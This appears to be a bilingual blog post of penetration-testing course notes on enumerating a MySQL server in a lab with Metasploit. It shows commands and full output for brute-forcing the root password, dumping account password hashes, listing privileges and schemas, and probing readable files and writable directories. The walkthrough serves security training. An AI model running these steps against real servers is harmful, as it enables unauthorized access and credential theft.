---
layout: post
title: "MySQL Enumeration"
date: "2022-12-12"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# MySQL Enumeration
MySQL is an open-source relational database management system based on SQL (Structured Query Language).

It is typically used to store records, customer data, and is most commonly deployed to store web application data.

MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port.

We can utilize auxiliary modules to enumerate the version of MySQL, perform brute-force attacks to identify passwords, execute SQL queries and much more.

# MySQL枚举
MySQL 是一种基于 SQL（结构化查询语言）的开源关系数据库管理系统。

它通常用于存储记录、客户数据，最常用于存储 Web 应用程序数据。

MySQL 默认使用 TCP 端口 3306，但是，与任何服务一样，它可以托管在任何开放的 TCP 端口上。

我们可以利用辅助模块来枚举 MySQL 的版本，执行暴力攻击来识别密码，执行 SQL 查询等等。

# Demo: MySQL Enumeration（演示：MySQL 枚举）

```
ifconfig
eth1: 192.143.6.2
```

```
service postgresql start
msfconsole -q
workspace -a MySQL_ENUM
setg RHOSTS 192.143.6.3
setg RHOST 192.143.6.3
```

Confirm port 3306 is open on the target by performing a port scan.

```
search portscan
use auxiliary/scanner/portscan/tcp
show options
run
```

Identify the version of MySQL that's running.

[MySQL Server Version Enumeration](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_version/)

MySQL 服务器版本枚举

枚举 MySQL 服务器的版本。

```
search type:auxiliary name:mysql
use auxiliary/scanner/mysql/mysql_version
show options
run 
```

When it comes down to further enumeration of MySQL, we need some access to the database server. And in order to obtain that access, we can either find an exploit for this version of MySQL. However, there isn't any active exploit that can allow us to target this version. So what we'll need to do is perform a brute force in order to identify whether we can find any legitimate credentials that can provide us with some form of access to the MySQL database server.

When we talk about MySQL and the credentials that we are pretty much going to be after, that is going to be the root credentials. Because the root user on any system has all privileges. And so instead of performing a brute force for usernames, we can automatically set the username to root and then try and see whether we can find any passwords for the root user.

[MySQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/)

MySQL 登录实用程序

该模块简单地查询 MySQL 实例以获取特定用户/密码（默认为 root 和空白）。

```
search mysql_login
use auxiliary/scanner/mysql/mysql_login
show options
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run 
```

Perform some MySQL enumeration.

```
search mysql_enum
```

It falls under the Admin subdirectory under auxiliary modules, which means in order to utilize it, we require credentials, which in this case, we already have.

[MySQL Enumeration Module](https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum/)

MySQL枚举模块

此模块允许简单枚举 MySQL 数据库服务器，提供适当的凭据以进行远程连接。

```
use auxiliary/admin/mysql/mysql_enum
info
set PASSWORD twinkle
set USERNAME root
run
```

It will enumerate a list of accounts with their password hashes, and this is referring to accounts for the MySQL database server. We also get the other information pertinent to privileges, so we can see that the following users have grant privilege. The only user who has these privileges is the root user. 

This module is used to enumerate additional information. In order to do that, it requires access through credentials. If we had obtained access via another user, then the information displayed here, like the root user hash, would be very important. Because we could then take it and crack it and then be able to get root access on the MySQL database server.

```
search mysql_sql
```

This is also falls under the Admin subdirectory under auxiliary modules, which means we require credentials in order to run it. What this module allows us to do is execute SQL queries, which means we can now interact with the MySQL database server.

[MySQL SQL Generic Query](https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_sql/)

MySQL SQL 通用查询

该模块允许在给定适当凭据的情况下针对 MySQL 实例执行简单的 SQL 语句。

```
use auxiliary/admin/mysql/mysql_sql
show options
set PASSWORD twinkle
set USERNAME root
run
```

This will display a list of all databases that are currently on the MySQL database server. This will tell us what databases are currently on there, and it'll give us an idea of what applications are using the MySQL database server.

```
set SQL show databases;
run
set SQL use videos;
run
```

Learn more information about the MySQL database schema.

[MYSQL Schema Dump](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump/)

MYSQL 架构转储

该模块从 MySQL 数据库服务器中提取架构信息。

```
search mysql_schema
use auxiliary/scanner/mysql/mysql_schemadump
show options
set PASSWORD twinkle
set USERNAME root
run
```

It brings out or displays the schema. And in this case, for all the databases, they don't have any tables under them. If we did have any data within this database, it would display the tables that fall under the databases. And then we would have an idea of what to target and we could use previous module that allowed us to execute various SQL queries. 

Log in using the MySQL utility through the command line. And that will give you a full control or access to the MySQL database server, because we already have the credentials. 

If we take a look at the information we've been able to gather.

```
hosts
services
loot # display the schema
creds # Dump out all the credentials that we were able to gather through the MySQL enumeration module
```

This is why I recommand creating a workspace for every assessment, because you can then go through all the information you were able to gather, because the MSF will store all of this information, so you can always go back to it in the event that you missed out on something.

```
exit
```

```
mysql -h 192.143.6.3 -u root -p

MySQL [(none)]> show databases;
MySQL [(none)]> use videos;
MySQL [(none)]> show tables;
MySQL [(none)]> exit
```

# MySQL Enumeration
## Overview
In this lab, run the following auxiliary modules against the target:
* auxiliary/admin/mysql/mysql_enum
* auxiliary/admin/mysql/mysql_sql
* auxiliary/scanner/mysql/mysql_file_enum
* auxiliary/scanner/mysql/mysql_hashdump
* auxiliary/scanner/mysql/mysql_login
* auxiliary/scanner/mysql/mysql_schemadump
* auxiliary/scanner/mysql/mysql_version
* auxiliary/scanner/mysql/mysql_writable_dirs

Instructions: 
* This lab is dedicated to you! No other users are on this network :)
* Once you start the lab, you will have access to a root terminal of a Kali instance
* Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
* The target server should be located at the IP address 192.X.Y.3.
* Do not attack the gateway located at IP address 192.X.Y.1
* postgresql is not running by default so Metasploit may give you an error about this when starting

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-120.pdf

## 我自己的解决思路
[MySQL Enumeration Module](https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum/)

MySQL枚举模块

此模块允许简单枚举 MySQL 数据库服务器，提供适当的凭据以进行远程连接。

[MySQL SQL Generic Query](https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_sql/)

MySQL SQL 通用查询

该模块允许在给定适当凭据的情况下针对 MySQL 实例执行简单的 SQL 语句。

[MYSQL File/Directory Enumerator](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum/)

MYSQL 文件/目录枚举器

使用 MySQL load_file 功能枚举文件和目录，有关更多信息，请参阅参考资料中的 URL。

[MYSQL Password Hashdump](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump/)

MYSQL 密码哈希转储

该模块从 MySQL 服务器中提取用户名和加密密码哈希值，并存储它们以备日后破解之用。

[MySQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/)

MySQL 登录实用程序

该模块简单地查询 MySQL 实例以获取特定用户/密码（默认为 root 和空白）。

[MYSQL Schema Dump](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump/)

MYSQL 架构转储

该模块从 MySQL 数据库服务器中提取架构信息。

[MySQL Server Version Enumeration](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_version/)

MySQL 服务器版本枚举

枚举 MySQL 服务器的版本。

[MYSQL Directory Write Test](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs/)

MYSQL 目录写入测试

使用 MySQL SELECT INTO DUMPFILE 功能枚举可写目录，有关更多信息，请参阅参考资料中的 URL。注意：对于找到的每个可写目录，一个包含文本测试的具有指定 FILE_NAME 的文件将被写入该目录。

## 我自己的思路

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.34.86.2  netmask 255.255.255.0  broadcast 192.34.86.255
        ether 02:42:c0:22:56:02  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > setg RHOSTS 192.34.86.3
RHOSTS => 192.34.86.3
msf5 > setg RHOST 192.34.86.3
RHOST => 192.34.86.3
msf5 > workspace -a MySQL_Enum
[*] Added workspace: MySQL_Enum
[*] Workspace: MySQL_Enum
msf5 > workspace
  default
* MySQL_Enum
```

```
msf5 > search type:auxiliary name:mysql

Matching Modules
================

   #   Name                                               Disclosure Date  Rank    Check  Description
   -   ----                                               ---------------  ----    -----  -----------
   1   auxiliary/admin/mysql/mysql_enum                                    normal  No     MySQL Enumeration Module
   2   auxiliary/admin/mysql/mysql_sql                                     normal  No     MySQL SQL Generic Query
   3   auxiliary/analyze/jtr_mysql_fast                                    normal  No     John the Ripper MySQL Password Cracker (Fast Mode)
   4   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal  Yes    MySQL Authentication Bypass Password Dump
   5   auxiliary/scanner/mysql/mysql_file_enum                             normal  Yes    MYSQL File/Directory Enumerator
   6   auxiliary/scanner/mysql/mysql_hashdump                              normal  Yes    MYSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_login                                 normal  Yes    MySQL Login Utility
   8   auxiliary/scanner/mysql/mysql_schemadump                            normal  Yes    MYSQL Schema Dump
   9   auxiliary/scanner/mysql/mysql_version                               normal  Yes    MySQL Server Version Enumeration
   10  auxiliary/scanner/mysql/mysql_writable_dirs                         normal  Yes    MYSQL Directory Write Test
   11  auxiliary/server/capture/mysql                                      normal  No     Authentication Capture: MySQL
```

```
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.34.86.3:          - 192.34.86.3:3306 - TCP OPEN
[*] 192.34.86.3:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/mysql/mysql_version
msf5 auxiliary(scanner/mysql/mysql_version) > run

[+] 192.34.86.3:3306      - 192.34.86.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/mysql/mysql_version) > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.34.86.3      yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.34.86.3:3306      - 192.34.86.3:3306 - Success: 'root:twinkle'
[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/mysql/mysql_login) > use auxiliary/scanner/mysql/mysql_writable_dirs
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > show options

Module options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DIR_LIST                    yes       List of directories to test
   FILE_NAME  qqyWZeFH         yes       Name of file to write
   PASSWORD                    no        The password for the specified username
   RHOSTS     192.34.86.3      yes       The target address range or CIDR identifier
   RPORT      3306             yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads
   USERNAME   root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
DIR_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > run

[!] 192.34.86.3:3306      - For every writable directory found, a file called qqyWZeFH with the text test will be written to the directory.
[*] 192.34.86.3:3306      - Login...
[*] 192.34.86.3:3306      - Checking /tmp...
[+] 192.34.86.3:3306      - /tmp is writeable
[*] 192.34.86.3:3306      - Checking /etc/passwd...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/passwd/qqyWZeFH' (Errcode: 20)
[*] 192.34.86.3:3306      - Checking /etc/shadow...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/shadow/qqyWZeFH' (Errcode: 20)
[*] 192.34.86.3:3306      - Checking /root...
[+] 192.34.86.3:3306      - /root is writeable
[*] 192.34.86.3:3306      - Checking /home...
[!] 192.34.86.3:3306      - Can't create/write to file '/home/qqyWZeFH' (Errcode: 13)
[*] 192.34.86.3:3306      - Checking /etc...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/qqyWZeFH' (Errcode: 13)
[*] 192.34.86.3:3306      - Checking /etc/hosts...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/hosts/qqyWZeFH' (Errcode: 20)
[*] 192.34.86.3:3306      - Checking /usr/share...
[!] 192.34.86.3:3306      - Can't create/write to file '/usr/share/qqyWZeFH' (Errcode: 13)
[*] 192.34.86.3:3306      - Checking /etc/config...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/config/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /data...
[!] 192.34.86.3:3306      - Can't create/write to file '/data/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /webdav...
[!] 192.34.86.3:3306      - Can't create/write to file '/webdav/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /doc...
[!] 192.34.86.3:3306      - Can't create/write to file '/doc/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /icons...
[!] 192.34.86.3:3306      - Can't create/write to file '/icons/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /manual...
[!] 192.34.86.3:3306      - Can't create/write to file '/manual/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /pro...
[!] 192.34.86.3:3306      - Can't create/write to file '/pro/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /secure...
[!] 192.34.86.3:3306      - Can't create/write to file '/secure/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /poc...
[!] 192.34.86.3:3306      - Can't create/write to file '/poc/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /pro...
[!] 192.34.86.3:3306      - Can't create/write to file '/pro/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /dir...
[!] 192.34.86.3:3306      - Can't create/write to file '/dir/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Benefits...
[!] 192.34.86.3:3306      - Can't create/write to file '/Benefits/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Data...
[!] 192.34.86.3:3306      - Can't create/write to file '/Data/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Invitation...
[!] 192.34.86.3:3306      - Can't create/write to file '/Invitation/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Office...
[!] 192.34.86.3:3306      - Can't create/write to file '/Office/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Site...
[!] 192.34.86.3:3306      - Can't create/write to file '/Site/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /Admin...
[!] 192.34.86.3:3306      - Can't create/write to file '/Admin/qqyWZeFH' (Errcode: 2)
[*] 192.34.86.3:3306      - Checking /etc...
[!] 192.34.86.3:3306      - Can't create/write to file '/etc/qqyWZeFH' (Errcode: 13)
[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_file_enum
msf5 auxiliary(scanner/mysql/mysql_file_enum) > show options

Module options (auxiliary/scanner/mysql/mysql_file_enum):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   DATABASE_NAME  mysql            yes       Name of database to use
   FILE_LIST                       yes       List of directories to enumerate
   PASSWORD                        no        The password for the specified username
   RHOSTS         192.34.86.3      yes       The target address range or CIDR identifier
   RPORT          3306             yes       The target port (TCP)
   TABLE_NAME     KiYrCGgK         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted
   THREADS        1                yes       The number of concurrent threads
   USERNAME       root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_file_enum) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/files.txt
FILE_LIST => /usr/share/metasploit-framework/data/wordlists/files.txt
msf5 auxiliary(scanner/mysql/mysql_file_enum) > run

[+] 192.34.86.3:3306      - /etc/passwd is a file and exists
[+] 192.34.86.3:3306      - /etc/hosts is a file and exists
[+] 192.34.86.3:3306      - /etc/group is a file and exists
[+] 192.34.86.3:3306      - /etc/hostname is a file and exists
[+] 192.34.86.3:3306      - /etc/resolv.conf is a file and exists
[+] 192.34.86.3:3306      - /etc/default is a directory and exists
[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 > use auxiliary/scanner/mysql/mysql_schemadump
msf5 auxiliary(scanner/mysql/mysql_schemadump) > show options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS           192.34.86.3      yes       The target address range or CIDR identifier
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads
   USERNAME                          no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_schemadump) > run

[+] 192.34.86.3:3306      - Schema stored in: /root/.msf4/loot/20221212034838_default_192.34.86.3_mysql_schema_750926.txt
[+] 192.34.86.3:3306      - MySQL Server Schema 
 Host: 192.34.86.3 
 Port: 3306 
 ====================

---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []

[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/mysql/mysql_schemadump) > use auxiliary/scanner/mysql/mysql_hashdump
msf5 auxiliary(scanner/mysql/mysql_hashdump) > show options
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 192.34.86.3:3306      - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.34.86.3:3306      - Saving HashString as Loot: root:
[+] 192.34.86.3:3306      - Saving HashString as Loot: root:
[+] 192.34.86.3:3306      - Saving HashString as Loot: root:
[+] 192.34.86.3:3306      - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.34.86.3:3306      - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.34.86.3:3306      - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.34.86.3:3306      - Saving HashString as Loot: ultra:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.34.86.3:3306      - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.34.86.3:3306      - Saving HashString as Loot: gopher:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.34.86.3:3306      - Saving HashString as Loot: backup:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.34.86.3:3306      - Saving HashString as Loot: sysadmin:*78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.34.86.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/mysql/mysql_hashdump) > use auxiliary/admin/mysql/mysql_enum
msf5 auxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(admin/mysql/mysql_enum) > set USERNAME root
USERNAME => root
msf5 auxiliary(admin/mysql/mysql_enum) > run
[*] Running module against 192.34.86.3

[*] 192.34.86.3:3306 - Running MySQL Enumerator...
[*] 192.34.86.3:3306 - Enumerating Parameters
[*] 192.34.86.3:3306 -  MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.34.86.3:3306 -  Compiled for the following OS: debian-linux-gnu
[*] 192.34.86.3:3306 -  Architecture: x86_64
[*] 192.34.86.3:3306 -  Server Hostname: victim-1
[*] 192.34.86.3:3306 -  Data Directory: /var/lib/mysql/
[*] 192.34.86.3:3306 -  Logging of queries and logins: OFF
[*] 192.34.86.3:3306 -  Old Password Hashing Algorithm OFF
[*] 192.34.86.3:3306 -  Loading of local files: ON
[*] 192.34.86.3:3306 -  Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.34.86.3:3306 -  Allow Use of symlinks for Database Files: YES
[*] 192.34.86.3:3306 -  Allow Table Merge: 
[*] 192.34.86.3:3306 -  SSL Connection: DISABLED
[*] 192.34.86.3:3306 - Enumerating Accounts:
[*] 192.34.86.3:3306 -  List of Accounts with Password Hashes:
[+] 192.34.86.3:3306 -          User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f Password Hash: 
[+] 192.34.86.3:3306 -          User: root Host: 127.0.0.1 Password Hash: 
[+] 192.34.86.3:3306 -          User: root Host: ::1 Password Hash: 
[+] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.34.86.3:3306 -          User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.34.86.3:3306 -          User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.34.86.3:3306 -          User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.34.86.3:3306 -          User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.34.86.3:3306 -          User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.34.86.3:3306 -          User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.34.86.3:3306 -          User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.34.86.3:3306 -  The following users have GRANT Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following users have CREATE USER Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following users have RELOAD Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following users have SHUTDOWN Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following users have SUPER Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following users have FILE Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -          User: filetest Host: %
[*] 192.34.86.3:3306 -  The following users have PROCESS Privilege:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following accounts have privileges to the mysql database:
[*] 192.34.86.3:3306 -          User: root Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -          User: debian-sys-maint Host: localhost
[*] 192.34.86.3:3306 -          User: root Host: %
[*] 192.34.86.3:3306 -  The following accounts have empty passwords:
[*] 192.34.86.3:3306 -          User: root Host: 891b50fafb0f
[*] 192.34.86.3:3306 -          User: root Host: 127.0.0.1
[*] 192.34.86.3:3306 -          User: root Host: ::1
[*] 192.34.86.3:3306 -  The following accounts are not restricted by source:
[*] 192.34.86.3:3306 -          User: filetest Host: %
[*] 192.34.86.3:3306 -          User: root Host: %
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(admin/mysql/mysql_enum) > use auxiliary/admin/mysql/mysql_sql
msf5 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS    192.34.86.3       yes       The target address range or CIDR identifier
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

msf5 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.34.86.3

[*] 192.34.86.3:3306 - Sending statement: 'select version()'...
[*] 192.34.86.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mysql/mysql_sql) > set SQL show databases;
SQL => show databases;
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.34.86.3

[*] 192.34.86.3:3306 - Sending statement: 'show databases;'...
[*] 192.34.86.3:3306 -  | information_schema |
[*] 192.34.86.3:3306 -  | mysql |
[*] 192.34.86.3:3306 -  | performance_schema |
[*] 192.34.86.3:3306 -  | upload |
[*] 192.34.86.3:3306 -  | vendors |
[*] 192.34.86.3:3306 -  | videos |
[*] 192.34.86.3:3306 -  | warehouse |
[*] Auxiliary module execution completed

```

```
root@attackdefense:~# mysql -h 192.34.86.3 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1023
Server version: 5.5.61-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

